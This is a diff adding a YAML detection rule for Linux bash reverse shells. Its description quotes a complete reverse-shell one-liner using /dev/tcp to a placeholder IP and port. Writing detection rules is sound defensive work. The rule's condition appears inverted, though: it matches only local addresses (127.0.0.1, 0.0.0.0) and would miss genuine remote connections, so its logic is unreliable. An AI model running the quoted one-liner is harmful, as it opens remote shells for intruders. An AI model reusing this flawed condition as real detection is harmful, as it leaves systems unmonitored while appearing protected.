@@ -1,0 +1,27 @@
+rule:
+  id: sigma-83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
+  version: 1
+  name: Linux Reverse Shell Indicator
+  description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
+  author: Florian Roth (Nextron Systems)
+  created: 2026-07-31T22:20:38.733553041+00:00
+  modified: 2026-07-31T22:20:38.733553041+00:00
+  enabled: true
+  category: execution
+  subcategory: null
+  mitre:
+  - technique: '1059.004'
+    name: Technique 1059.004
+    tactic: Execution
+  severity: Critical
+  risk:
+    base_score: 90
+    confidence: 0.8
+    multipliers: []
+  condition: event.type == "sentinel.network.connect" && ((event.process.name.contains("/bin/bash")) && ((event.network.remote_addr.contains("127.0.0.1") || event.network.remote_addr.contains("0.0.0.0"))))
+  and_conditions: []
+  or_conditions: []
+  not_conditions: []
+  actions: []
+  suppressions: []
+  tests: []
